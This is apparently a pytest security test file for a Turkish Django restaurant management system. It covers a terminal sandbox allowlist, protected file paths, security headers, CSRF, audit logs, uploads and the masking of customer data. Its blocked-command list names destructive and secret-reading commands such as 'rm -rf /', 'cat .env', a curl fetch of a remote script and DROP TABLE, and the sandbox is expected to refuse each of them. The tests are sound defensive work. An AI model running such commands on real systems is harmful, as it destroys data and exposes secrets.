"""Güvenlik testleri: terminal sandbox'ı, dosya erişimi, başlıklar, denetim kaydı."""

from __future__ import annotations

import pytest
from django.urls import reverse

from apps.core.models import AuditLog
from apps.devcenter import sandbox
from apps.devcenter import services as dev_services

pytestmark = pytest.mark.django_db


# ------------------------------------------------------------------ komut allowlist
@pytest.mark.parametrize(
    "command",
    [
        "rm -rf /",
        "del C:\\Windows\\System32",
        "Remove-Item -Recurse D:\\Restaurant",
        "format C:",
        "reg add HKLM\\Software\\Test",
        "net user hacker /add",
        "shutdown /s",
        "curl http://kotu-site.com/script.sh",
        "python manage.py check && rm file.txt",
        "cat .env",
        "type .env",
        "git push origin main",
        "git reset --hard HEAD~5",
        "python manage.py flush",
        "echo test > dosya.txt",
        "python -c 'print(1)' | sh",
        "psql -c 'DROP TABLE orders_order'",
    ],
)
def test_dangerous_commands_blocked(command):
    check = sandbox.check_command(command)
    assert not check.allowed, f"Engellenmeliydi: {command}"
    assert check.reason


@pytest.mark.parametrize(
    "command",
    [
        "python manage.py check",
        "pytest -q",
        "ruff check .",
        "black --check .",
        "git status",
        "git diff --stat",
        "git log",
        "pip list",
        "mypy apps",
    ],
)
def test_safe_commands_allowed(command):
    check = sandbox.check_command(command)
    assert check.allowed, f"İzin verilmeliydi: {command} — {check.reason}"


def test_unknown_program_blocked():
    check = sandbox.check_command("wget http://ornek.com")
    assert not check.allowed


def test_disallowed_subcommand_blocked():
    check = sandbox.check_command("git rebase -i HEAD~3")
    assert not check.allowed
    assert "izinli değil" in check.reason


@pytest.mark.parametrize(
    "command",
    ["pip install django", "git commit -m test", "python manage.py migrate", "npm install"],
)
def test_side_effect_commands_need_confirmation(command):
    check = sandbox.check_command(command)
    assert check.allowed
    assert check.needs_confirmation, f"Onay istenmeliydi: {command}"


def test_path_traversal_blocked():
    check = sandbox.check_command("python ../../../etc/passwd")
    assert not check.allowed


def test_absolute_path_outside_root_blocked():
    check = sandbox.check_command("python C:\\Windows\\System32\\calc.py")
    assert not check.allowed


def test_empty_command_rejected():
    assert not sandbox.check_command("").allowed


def test_overlong_command_rejected():
    assert not sandbox.check_command("python " + "a" * 900).allowed


def test_blocked_command_is_audited(owner):
    run = sandbox.run_command("rm -rf /", user=owner)
    assert run.status == run.Status.BLOCKED
    assert AuditLog.objects.filter(
        action=AuditLog.Action.TERMINAL, severity=AuditLog.Severity.WARNING
    ).exists()


def test_command_runs_and_is_recorded(owner):
    run = sandbox.run_command("python --version", user=owner, confirmed=True)
    assert run.status in {run.Status.SUCCESS, run.Status.FAILED}
    assert run.command == "python --version"
    assert AuditLog.objects.filter(action=AuditLog.Action.TERMINAL).exists()


def test_sanitized_env_excludes_secrets(monkeypatch):
    monkeypatch.setenv("NVIDIA_API_KEY", "nvapi-" + "cok-gizli-anahtar")  # secret-scan: allow
    monkeypatch.setenv("DB_PASSWORD", "parola123")
    env = sandbox._sanitized_env()
    assert "NVIDIA_API_KEY" not in env
    assert "DB_PASSWORD" not in env
    assert "PATH" in env


# ------------------------------------------------------------------ dosya erişimi
@pytest.mark.parametrize(
    "path",
    [".env", ".env.example", "db.sqlite3", "../gizli.py", ".git/config", "media/foto.jpg"],
)
def test_protected_paths_not_editable(path):
    ok, reason = dev_services.is_editable(path)
    assert not ok, f"Korunmalıydı: {path}"
    assert reason


@pytest.mark.parametrize(
    "path", ["apps/core/models.py", "templates/base.html", "static/css/app.css", "README.md"]
)
def test_project_files_editable(path):
    ok, _ = dev_services.is_editable(path)
    assert ok, f"Düzenlenebilir olmalıydı: {path}"


def test_binary_extension_not_editable():
    ok, reason = dev_services.is_editable("apps/core/data.pkl")
    assert not ok
    assert "uzantısı" in reason


def test_file_listing_excludes_protected_paths():
    files = dev_services.list_project_files()
    assert not any(f.startswith(".env") for f in files)
    assert not any(f.startswith(".git/") for f in files)
    assert not any("node_modules" in f for f in files)


# ------------------------------------------------------------------ HTTP güvenliği
def test_security_headers_present(client, owner):
    client.force_login(owner)
    response = client.get(reverse("reports:dashboard"))
    assert response["X-Content-Type-Options"] == "nosniff"
    assert "Content-Security-Policy" in response
    assert "frame-ancestors 'none'" in response["Content-Security-Policy"]
    assert response["Permissions-Policy"]


def test_login_required_for_all_modules(client):
    for name in [
        "reports:dashboard",
        "orders:pos",
        "floor:table_map",
        "kitchen:display",
        "catalog:product_list",
        "inventory:ingredient_list",
        "crm:customer_list",
        "hr:employee_list",
        "ai:assistant",
        "devcenter:index",
    ]:
        response = client.get(reverse(name))
        assert response.status_code in (302, 403), name


def test_csrf_required_on_post(client, owner, table, pizza):
    from django.test import Client

    csrf_client = Client(enforce_csrf_checks=True)
    csrf_client.force_login(owner)
    response = csrf_client.post(reverse("orders:order_create"), {"order_type": "takeaway"})
    assert response.status_code == 403


def test_audit_log_is_immutable(owner):
    from apps.core.services import record_audit

    entry = record_audit(AuditLog.Action.UPDATE, user=owner, description="ilk kayıt")
    entry.description = "değiştirilmiş"
    with pytest.raises(ValueError, match="değiştirilemez"):
        entry.save()


def test_failed_login_is_audited(client):
    client.post(reverse("accounts:login"), {"username": "yok", "password": "yanlis"})
    assert AuditLog.objects.filter(action=AuditLog.Action.LOGIN_FAILED).exists()


def test_successful_login_is_audited(client, owner):
    client.post(reverse("accounts:login"), {"username": "patron", "password": "Test!2026Pass"})
    assert AuditLog.objects.filter(action=AuditLog.Action.LOGIN).exists()


def test_password_policy_rejects_weak_passwords():
    from django.contrib.auth.password_validation import validate_password
    from django.core.exceptions import ValidationError

    for weak in ["parola", "12345678901", "aaaaaaaaaaa", "password123"]:
        with pytest.raises(ValidationError):
            validate_password(weak)


def test_password_policy_accepts_strong_password():
    from django.contrib.auth.password_validation import validate_password

    validate_password("Guclu!Parola2026")


def test_upload_validation_rejects_wrong_magic_bytes():
    from django.core.exceptions import ValidationError
    from django.core.files.uploadedfile import SimpleUploadedFile

    from apps.core.utils import validate_upload

    fake = SimpleUploadedFile("zararli.jpg", b"MZ\x90\x00 executable", content_type="image/jpeg")
    with pytest.raises(ValidationError, match="uyuşmuyor"):
        validate_upload(fake)


def test_upload_validation_rejects_bad_extension():
    from django.core.exceptions import ValidationError
    from django.core.files.uploadedfile import SimpleUploadedFile

    from apps.core.utils import validate_upload

    fake = SimpleUploadedFile("script.exe", b"MZ\x90\x00", content_type="application/exe")
    with pytest.raises(ValidationError, match="İzin verilmeyen"):
        validate_upload(fake)


def test_customer_pii_masked_without_permission(waiter, db):
    from apps.crm.models import Customer

    customer = Customer.objects.create(
        first_name="Test", last_name="Müşteri", phone="05321234567", email="test@example.invalid"
    )
    assert not waiter.has_perm_code("customer.pii")
    assert customer.masked_phone == "0532***67"
    assert customer.masked_email == "t***@example.invalid"


def test_kvkk_anonymization_removes_personal_data(db, owner):
    from apps.crm.models import Customer

    customer = Customer.objects.create(
        first_name="Silinecek",
        last_name="Kişi",
        phone="05321234567",
        email="silinecek@example.invalid",
        address="Örnek Mahallesi 1",
    )
    customer.anonymize(user=owner, reason="Müşteri talebi")
    customer.refresh_from_db()
    assert customer.phone == ""
    assert customer.email == ""
    assert customer.address == ""
    assert customer.is_anonymized
    assert "Anonim" in customer.first_name
    assert AuditLog.objects.filter(action=AuditLog.Action.DATA_ERASURE).exists()
